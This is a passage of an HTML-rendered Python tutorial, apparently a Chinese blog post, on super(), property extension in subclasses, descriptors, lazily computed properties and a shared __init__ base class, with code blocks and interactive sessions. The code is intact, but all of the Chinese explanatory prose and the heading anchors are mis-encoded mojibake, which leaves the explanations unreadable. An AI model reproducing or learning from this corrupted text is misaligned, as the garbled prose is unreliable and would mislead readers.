class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.y = <span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>super()</code>çš„å¦å¤–ä¸€ä¸ªå¸¸è§ç”¨æ³•å‡ºç°åœ¨è¦†ç›–<code>Python</code>ç‰¹æ®Šæ–¹æ³•çš„ä»£ç ä¸­ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        self._obj = obj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Delegate attribute lookup to internal obj</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._obj, name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Delegate attribute assignment</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">'_'</span>):</span><br><span class="line">            super().__setattr__(name, value) <span class="comment"># Call original __setattr__</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            setattr(self._obj, name, value)</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>__setattr__()</code>çš„å®ç°åŒ…å«ä¸€ä¸ªåå­—æ£€æŸ¥ã€‚å¦‚æœæŸä¸ªå±æ€§åä»¥ä¸‹åˆ’çº¿<code>(_)</code>å¼€å¤´ï¼Œå°±é€šè¿‡<code>super()</code>è°ƒç”¨åŸå§‹çš„<code>__setattr__()</code>ï¼Œ å¦åˆ™çš„è¯å°±å§”æ´¾ç»™å†…éƒ¨çš„ä»£ç†å¯¹è±¡<code>self._obj</code>å»å¤„ç†ã€‚å› ä¸ºå°±ç®—æ²¡æœ‰æ˜¾å¼çš„æŒ‡æ˜æŸä¸ªç±»çš„çˆ¶ç±»ï¼Œ<code>super()</code>ä»ç„¶å¯ä»¥æœ‰æ•ˆçš„å·¥ä½œã€‚</p><h4 id="å­ç±»ä¸­æ‰©å±•property"><a href="#å­ç±»ä¸­æ‰©å±•property" class="headerlink" title="å­ç±»ä¸­æ‰©å±•property"></a>å­ç±»ä¸­æ‰©å±•property</h4><p>å¦‚ä¸‹ä»£ç å®šä¹‰äº†ä¸€ä¸ª<code>property</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Getter function</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Setter function</span></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">        self._name = value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deleter function</span></span><br><span class="line"><span class="meta">    @name.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> AttributeError(<span class="string">"Can't delete attribute"</span>)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ç±»ï¼Œå®ƒç»§æ‰¿è‡ª<code>Person</code>å¹¶æ‰©å±•äº†<code>name</code>å±æ€§çš„åŠŸèƒ½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubPerson</span><span class="params">(Person)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Getting name'</span>)</span><br><span class="line">        <span class="keyword">return</span> super().name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        print(<span class="string">'Setting name to'</span>, value)</span><br><span class="line">        super(SubPerson, SubPerson).name.__set__(self, value)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @name.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Deleting name'</span>)</span><br><span class="line">        super(SubPerson, SubPerson).name.__delete__(self)</span><br></pre></td></tr></table></figure><p>å¦‚æœä»…ä»…åªæƒ³æ‰©å±•<code>property</code>çš„æŸä¸€ä¸ªæ–¹æ³•ï¼Œé‚£ä¹ˆå¯ä»¥åƒä¸‹é¢è¿™æ ·å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubPerson</span><span class="params">(Person)</span>:</span></span><br><span class="line"><span class="meta">    @Person.name.getter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Getting name'</span>)</span><br><span class="line">        <span class="keyword">return</span> super().name</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºæ–°çš„ç±»æˆ–å®ä¾‹å±æ€§"><a href="#åˆ›å»ºæ–°çš„ç±»æˆ–å®ä¾‹å±æ€§" class="headerlink" title="åˆ›å»ºæ–°çš„ç±»æˆ–å®ä¾‹å±æ€§"></a>åˆ›å»ºæ–°çš„ç±»æˆ–å®ä¾‹å±æ€§</h4><p>å¦‚æœæƒ³åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„å®ä¾‹å±æ€§ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ªæè¿°å™¨ç±»çš„å½¢å¼æ¥å®šä¹‰å®ƒçš„åŠŸèƒ½ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Integer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, instance, cls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> instance.__dict__[self.name]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, instance, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected an int'</span>)</span><br><span class="line">        instance.__dict__[self.name] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delete__</span><span class="params">(self, instance)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> instance.__dict__[self.name]</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæè¿°å™¨å°±æ˜¯ä¸€ä¸ªå®ç°äº†ä¸‰ä¸ªæ ¸å¿ƒçš„å±æ€§è®¿é—®æ“ä½œ(<code>get,set,delete</code>)çš„ç±»ï¼Œåˆ†åˆ«ä¸º(<code>__get__(),__set__(),__delete__()</code>)è¿™ä¸‰ä¸ªç‰¹æ®Šçš„æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•æ¥å—ä¸€ä¸ªå®ä¾‹ä½œä¸ºè¾“å…¥ï¼Œä¹‹åç›¸åº”çš„æ“ä½œå®ä¾‹åº•å±‚çš„å­—å…¸ã€‚ä¸ºäº†ä½¿ç”¨ä¸€ä¸ªæè¿°å™¨ï¼Œéœ€å°†è¿™ä¸ªæè¿°å™¨çš„å®ä¾‹ä½œä¸ºç±»å±æ€§æ”¾åˆ°ä¸€ä¸ªç±»çš„å®šä¹‰ä¸­ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    x = Integer(<span class="string">'x'</span>)</span><br><span class="line">    y = Integer(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br></pre></td></tr></table></figure><p>è¿™æ ·åšæ‰€æœ‰å¯¹æè¿°å™¨å±æ€§ï¼ˆå¦‚xæˆ–yï¼‰çš„è®¿é—®ä¼šè¢«ï¼ˆ<code>__get__(),__set__(),__delete__()</code>ï¼‰æ–¹æ³•æ•è·åˆ°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.x <span class="comment"># Calls Point.x.__get__(p,Point)</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.y = <span class="number">5</span> <span class="comment"># Calls Point.y.__set__(p, 5)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.x = <span class="number">2.3</span> <span class="comment"># Calls Point.x.__set__(p, 2.3)</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"descrip.py"</span>, line <span class="number">12</span>, <span class="keyword">in</span> __set__</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected an int'</span>)</span><br><span class="line">TypeError: Expected an int</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ä½œä¸ºè¾“å…¥ï¼Œæè¿°å™¨çš„æ¯ä¸€ä¸ªæ–¹æ³•ä¼šæ¥å—ä¸€ä¸ªæ“ä½œå®ä¾‹ã€‚ä¸ºäº†å®ç°è¯·æ±‚æ“ä½œï¼Œä¼šç›¸åº”çš„æ“ä½œå®ä¾‹åº•å±‚çš„å­—å…¸(<code>__dict__</code>å±æ€§)ã€‚ æè¿°å™¨çš„<code>self.name</code>å±æ€§å­˜å‚¨äº†åœ¨å®ä¾‹å­—å…¸ä¸­è¢«å®é™…ä½¿ç”¨åˆ°çš„<code>key</code>ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šæè¿°å™¨åªèƒ½åœ¨ç±»çº§åˆ«è¢«å®šä¹‰ï¼Œè€Œä¸èƒ½ä¸ºæ¯ä¸ªå®ä¾‹å•ç‹¬å®šä¹‰ã€‚å› æ­¤ï¼Œä¸‹é¢çš„ä»£ç æ˜¯æ— æ³•å·¥ä½œçš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = Integer(<span class="string">'x'</span>) <span class="comment"># é”™è¯¯ï¼Œå¿…é¡»æ˜¯ç±»å˜é‡</span></span><br><span class="line">        self.y = Integer(<span class="string">'y'</span>)</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨å»¶è¿Ÿè®¡ç®—å±æ€§"><a href="#ä½¿ç”¨å»¶è¿Ÿè®¡ç®—å±æ€§" class="headerlink" title="ä½¿ç”¨å»¶è¿Ÿè®¡ç®—å±æ€§"></a>ä½¿ç”¨å»¶è¿Ÿè®¡ç®—å±æ€§</h4><p>å¦‚æœæƒ³å°†ä¸€ä¸ªåªè¯»å±æ€§å®šä¹‰æˆä¸€ä¸ª<code>property</code>ï¼Œå¹¶ä¸”åªåœ¨è®¿é—®çš„æ—¶å€™æ‰ä¼šè®¡ç®—ç»“æœã€‚ ä½†æ˜¯ä¸€æ—¦è¢«è®¿é—®åï¼Œä½ å¸Œæœ›ç»“æœå€¼è¢«ç¼“å­˜èµ·æ¥ï¼Œä¸ç”¨æ¯æ¬¡éƒ½å»è®¡ç®—ã€‚å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæè¿°å™¨ç±»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lazyproperty</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, func)</span>:</span></span><br><span class="line">        self.func = func</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, instance, cls)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = self.func(instance)</span><br><span class="line">            setattr(instance, self.func.__name__, value)</span><br><span class="line">            <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šè¿°æè¿°å™¨ç±»ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, radius)</span>:</span></span><br><span class="line">        self.radius = radius</span><br><span class="line"></span><br><span class="line"><span class="meta">    @lazyproperty</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">area</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Computing area'</span>)</span><br><span class="line">        <span class="keyword">return</span> math.pi * self.radius ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @lazyproperty</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">perimeter</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Computing perimeter'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * math.pi * self.radius</span><br></pre></td></tr></table></figure><p>äº¤äº’ç¯å¢ƒæ¼”ç¤ºå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Circle(<span class="number">4.0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.radius</span><br><span class="line"><span class="number">4.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line">Computing area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.perimeter</span><br><span class="line">Computing perimeter</span><br><span class="line"><span class="number">25.132741228718345</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.perimeter</span><br><span class="line"><span class="number">25.132741228718345</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°<code>Computing area</code>å’Œ<code>Computing perimeter</code>åªå‡ºç°äº†ä¸€æ¬¡ã€‚</p><p>è¿™ç§æ–¹æ¡ˆæœ‰ä¸€ä¸ªå°ç¼ºé™·å°±æ˜¯è®¡ç®—å‡ºçš„å€¼è¢«åˆ›å»ºåæ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line">Computing area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area = <span class="number">25</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line"><span class="number">25</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦ä¿®æ”¹è¿™ä¸ªé—®é¢˜å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lazyproperty</span><span class="params">(func)</span>:</span></span><br><span class="line">    name = <span class="string">'_lazy_'</span> + func.__name__</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lazy</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(self, name):</span><br><span class="line">            <span class="keyword">return</span> getattr(self, name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = func(self)</span><br><span class="line">            setattr(self, name, value)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">return</span> lazy</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹å¼ä¸å…è®¸ä¿®æ”¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Circle(<span class="number">4.0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line">Computing area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area</span><br><span class="line"><span class="number">50.26548245743669</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.area = <span class="number">25</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: can<span class="string">'t set attribute</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="ç®€åŒ–æ•°æ®ç»“æ„çš„åˆå§‹åŒ–"><a href="#ç®€åŒ–æ•°æ®ç»“æ„çš„åˆå§‹åŒ–" class="headerlink" title="ç®€åŒ–æ•°æ®ç»“æ„çš„åˆå§‹åŒ–"></a>ç®€åŒ–æ•°æ®ç»“æ„çš„åˆå§‹åŒ–</h4><p>å¦‚æœä¸æƒ³å†™å¤ªå¤š<code>__init__()</code>å‡½æ•°ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªåŸºç±»ä¸­å†™ä¸€ä¸ªå…¬ç”¨çš„<code>__init__()</code>å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Structure1</span>:</span></span><br><span class="line">    _fields = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(args) != len(self._fields):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected &#123;&#125; arguments'</span>.format(len(self._fields)))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> zip(self._fields, args):</span><br><span class="line">            setattr(self, name, value)</span><br></pre></td></tr></table></figure><p>ç„¶åè®©å†™çš„ç±»ç»§æ‰¿ä¸Šè¿°åŸºç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(Structure1)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(Structure1)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'x'</span>, <span class="string">'y'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span><span class="params">(Structure1)</span>:</span></span><br><span class="line">    _fields = [<span class="string">'radius'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">area</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> math.pi * self.radius ** <span class="number">2</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Circle(<span class="number">4.5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"structure.py"</span>, line <span class="number">6</span>, <span class="keyword">in</span> __init__</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected &#123;&#125; arguments'</span>.format(len(self._fields)))</span><br><span class="line">TypeError: Expected <span class="number">3</span> arguments</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥å°†ä¸åœ¨<code>_fields</code>ä¸­çš„åç§°åŠ å…¥åˆ°å±æ€§ä¸­å»ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Structure3</span>:</span></span><br><span class="line">    _fields = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(args) != len(self._fields):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected &#123;&#125; arguments'</span>.format(len(self._fields)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> zip(self._fields, args):</span><br><span class="line">            setattr(self, name, value)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è®¾ç½®é¢å¤–å±æ€§å€¼</span></span><br><span class="line">        extra_args = kwargs.keys() - self._fields</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> extra_args:</span><br><span class="line">            setattr(self, name, kwargs.pop(name))</span><br><span 